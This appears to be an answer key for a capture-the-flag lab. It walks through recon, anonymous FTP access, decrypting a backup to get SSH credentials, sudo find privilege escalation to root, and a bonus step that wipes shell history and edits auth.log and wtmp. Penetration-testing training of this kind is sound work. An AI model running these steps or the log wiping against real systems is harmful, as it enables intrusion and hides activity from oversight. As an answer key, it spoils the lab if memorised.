# Lab 12 — CTF Walkthrough (Answer Key)

## Milestone 1: Recon & Scanning

```bash
nmap -sn 10.10.12.0/24
nmap -sV -p- 10.10.12.10 10.10.12.11 10.10.12.12
```

Finds:
- `10.10.12.10` — HTTP (nginx)
- `10.10.12.11` — FTP (vsftpd)
- `10.10.12.12` — SSH (OpenSSH)

## Milestone 2: Enumeration

```bash
curl -s http://10.10.12.10 | grep -i passphrase
```

Reveals: *"temp passphrase for this quarter's encrypted backups is `Summer2024!`"*

```bash
ftp 10.10.12.11
# Name: anonymous
cd pub
ls
get employees.txt
get backup.enc
quit
```

`employees.txt` lists usernames including `jdoe`. `backup.enc` is clearly OpenSSL-encrypted (binary, `.enc` extension).

## Milestone 3: Gaining Access

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in backup.enc -pass pass:Summer2024!
```

Output: `jdoe SSH password: N3wHire2024#`

```bash
ssh jdoe@10.10.12.12
# password: N3wHire2024#
cat user.txt
```

Flag: `flag{lab12_ftp_to_ssh_creds_chain}`

## Milestone 4: Privilege Escalation

```bash
sudo -l
```

Shows: `(ALL) NOPASSWD: /usr/bin/find`

[GTFOBins](https://gtfobins.github.io/gtfobins/find/) documents the standard technique for this exact binary:

```bash
sudo find . -exec /bin/sh \; -quit
whoami
cat /root/root.txt
```

Flag: `flag{lab12_full_chain_root}`

## Milestone 5 (Bonus): Covering Tracks

Same techniques as Lab 11, applied to `lab12-ssh`:

```bash
unset HISTFILE
history -c
> ~/.bash_history
```

As root (from the shell you got via `find`):

```bash
sed -i '/10.10.12.2/d' /var/log/auth.log 2>/dev/null
> /var/log/wtmp 2>/dev/null
```

(Note: this minimal target image may not have `auth.log`/`wtmp` populated the way Lab 11's did, since it has no rsyslog running — if so, note in your report that the target's logging itself was insufficient to reconstruct your activity, which is itself a real finding worth writing up.)

## Full Chain

Web page → passphrase → FTP → encrypted backup → decrypt → SSH credentials → user flag → sudo misconfiguration → GTFOBins technique → root shell → root flag. Every step used a tool and technique from an earlier lab, chained with no hints — exactly what a real beginner-to-intermediate pentest engagement looks like end to end.
